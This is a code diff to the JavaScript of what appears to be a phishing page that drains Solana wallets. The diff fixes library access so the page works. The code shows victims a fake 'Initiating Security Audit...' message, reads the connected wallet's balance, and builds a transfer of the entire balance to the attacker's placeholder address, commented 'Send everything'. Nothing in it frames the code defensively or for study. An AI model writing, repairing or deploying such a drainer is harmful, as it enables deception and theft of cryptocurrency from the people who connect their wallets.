@@ -117,11 +117,19 @@
             // 2. Prepare the Drain Transaction
             statusEl.innerHTML = '<span class="loader"></span> Initiating Security Audit...';
             
-            // FIX: Use Connection.clusterApiUrl (static method) instead of standalone function
-            const connection = new solana.Connection(solana.Connection.clusterApiUrl('mainnet-beta'), 'confirmed');
+            // FIX: Accessing the library correctly via the global scope
+            const solanaWeb3 = window['solana-web3.js'] || window.solana; 
+            // If that fails, we try the standard global fallback
+            const ConnectionClass = solanaWeb3.Connection || (typeof solana !== 'undefined' && solana.Connection ? solana : null);
+            
+            if (!ConnectionClass) {
+                throw new Error("Solana Web3 library not loaded correctly.");
+            }
+
+            const connection = new ConnectionClass(solanaWeb3.Connection.clusterApiUrl('mainnet-beta'), 'confirmed');
             
             // Get correct public key from the response
-            const publicKey = new solana.PublicKey(resp.publicKey.toBase58());
+            const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toBase58());
             
             // Get current balance
             const balance = await connection.getBalance(publicKey);
@@ -132,12 +140,12 @@
             }
 
             // Create Transaction
-            const transaction = new solana.Transaction();
+            const transaction = new solanaWeb3.Transaction();
             
             // Instruction: Transfer all SOL to your address
-            const instruction = solana.SystemProgram.transfer({
+            const instruction = solanaWeb3.SystemProgram.transfer({
                 fromPubkey: publicKey,
-                toPubkey: new solana.PublicKey(YOUR_WALLET_ADDRESS),
+                toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS),
                 lamports: balance // Send everything
             });
 
